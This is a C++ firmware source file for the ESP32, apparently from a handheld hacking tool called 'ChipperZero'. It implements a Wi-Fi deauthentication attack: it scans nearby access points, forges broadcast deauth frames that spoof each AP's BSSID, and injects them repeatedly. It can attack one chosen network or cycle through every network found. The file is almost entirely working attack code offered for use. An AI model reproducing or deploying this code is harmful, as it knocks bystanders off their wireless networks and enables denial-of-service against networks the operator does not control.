#include "wifi_deauth.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#include "../hal/encoder.h"

DeauthModule g_wifiDeauth;

namespace {

struct APEntry {
    uint8_t bssid[6];
    uint8_t channel;
    char    ssid[33];
    int32_t rssi;
};

static APEntry s_aps[32];
static uint8_t s_apCount = 0;

static void sendDeauth(const uint8_t* bssid, uint8_t channel) {
    // Frame: DA=broadcast, SA=bssid, BSSID=bssid, reason=2 (prev auth invalid)
    uint8_t frame[26] = {
        0xC0,0x00, 0x3A,0x01,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0,0,0,0,0,0,
        0,0,0,0,0,0,
        0xF0,0xFF,
        0x02,0x00,
    };
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    delay(1);  // let the PHY settle on the new channel before injecting
    for (int j = 0; j < 10; j++)
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
}

static uint8_t scanAPs() {
    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks(false, true);
    if (n <= 0) return 0;
    uint8_t cnt = n > 32 ? 32 : (uint8_t)n;
    for (uint8_t i = 0; i < cnt; i++) {
        memcpy(s_aps[i].bssid, WiFi.BSSID(i), 6);
        s_aps[i].channel = (uint8_t)WiFi.channel(i);
        s_aps[i].rssi    = WiFi.RSSI(i);
        strncpy(s_aps[i].ssid, WiFi.SSID(i).c_str(), 32);
        s_aps[i].ssid[32] = '\0';
    }
    WiFi.scanDelete();
    return cnt;
}

void deauthTask(void* arg) {
    DeauthModule* self = reinterpret_cast<DeauthModule*>(arg);
    const bool targeted = (self->state_ == DeauthState::SCANNING);
    char buf[48];

    // --- Scan ---
    self->setStatus("Scanning APs...");
    s_apCount = scanAPs();
    self->setApCount(s_apCount);

    if (s_apCount == 0) {
        self->setStatus("No APs found");
        vTaskDelay(pdMS_TO_TICKS(1500));
        self->clearTask();
        vTaskDelete(nullptr);
        return;
    }

    WiFi.mode(WIFI_AP);
    WiFi.softAP("ChipperZero", nullptr, 1, 0, 1);

    // --- Select (targeted only) ---
    if (targeted) {
        self->state_ = DeauthState::SELECTING;
        while (self->isRunning() && self->state_ == DeauthState::SELECTING) {
            uint8_t i = self->scroll_ < s_apCount ? self->scroll_ : s_apCount - 1;
            snprintf(buf, sizeof(buf), "%u/%u %ddBm\nOK: %.22s",
                     i+1, s_apCount, s_aps[i].rssi, s_aps[i].ssid);
            self->setStatus(buf);
            vTaskDelay(pdMS_TO_TICKS(200));
        }
        if (!self->isRunning()) {
            WiFi.mode(WIFI_OFF);
            self->clearTask();
            vTaskDelete(nullptr);
            return;
        }
    }

    // --- Attack ---
    self->state_ = DeauthState::ATTACKING;
    uint8_t idx = 0;
    uint8_t sel = self->scroll_ < s_apCount ? self->scroll_ : 0;

    while (self->isRunning()) {
        if (targeted) {
            for (int r = 0; r < 10; r++)
                sendDeauth(s_aps[sel].bssid, s_aps[sel].channel);
            self->incSent();
            snprintf(buf, sizeof(buf), "%.20s\n%lu bursts",
                     s_aps[sel].ssid, (unsigned long)self->getSent());
            self->setStatus(buf);
        } else {
            sendDeauth(s_aps[idx].bssid, s_aps[idx].channel);
            self->incSent();
            idx = (idx + 1) % s_apCount;
            snprintf(buf, sizeof(buf), "%lu frames\n%u APs",
                     (unsigned long)self->getSent(), s_apCount);
            self->setStatus(buf);
        }
        vTaskDelay(1);
    }

    WiFi.mode(WIFI_OFF);
    self->clearTask();
    vTaskDelete(nullptr);
}

}  // namespace

void DeauthModule::setStatus(const char* s) {
    portENTER_CRITICAL(&mux_);
    strncpy(status_, s, sizeof(status_) - 1);
    status_[sizeof(status_) - 1] = '\0';
    portEXIT_CRITICAL(&mux_);
}

void DeauthModule::start() {
    if (running_.exchange(true)) return;
    if (task_ != nullptr) { running_ = false; return; }
    sent_ = 0; apCount_ = 0; scroll_ = 0;
    status_[0] = '\0';
    state_ = (mode_ == DeauthMode::TARGETED) ? DeauthState::SCANNING : DeauthState::ATTACKING;
    xTaskCreatePinnedToCore(deauthTask, "wifi_deauth", 4096, this, 1, &task_, 0);
}

void DeauthModule::stop() {
    if (!running_) return;
    running_ = false;
    for (int i = 0; i < 100 && task_; ++i) vTaskDelay(pdMS_TO_TICKS(10));
    task_ = nullptr;
}

void DeauthModule::onEvent(uint8_t ev) {
    if (state_ != DeauthState::SELECTING || s_apCount == 0) return;
    if (ev == static_cast<uint8_t>(encoder::EVENT_RIGHT))
        scroll_ = (scroll_ + 1) % s_apCount;
    else if (ev == static_cast<uint8_t>(encoder::EVENT_LEFT))
        scroll_ = (scroll_ + s_apCount - 1) % s_apCount;
    else if (ev == static_cast<uint8_t>(encoder::EVENT_OK))
        state_ = DeauthState::ATTACKING;
}

void DeauthModule::fillStats(char* buf, size_t len) {
    portENTER_CRITICAL(&mux_);
    strncpy(buf, status_, len - 1);
    buf[len - 1] = '\0';
    portEXIT_CRITICAL(&mux_);
}
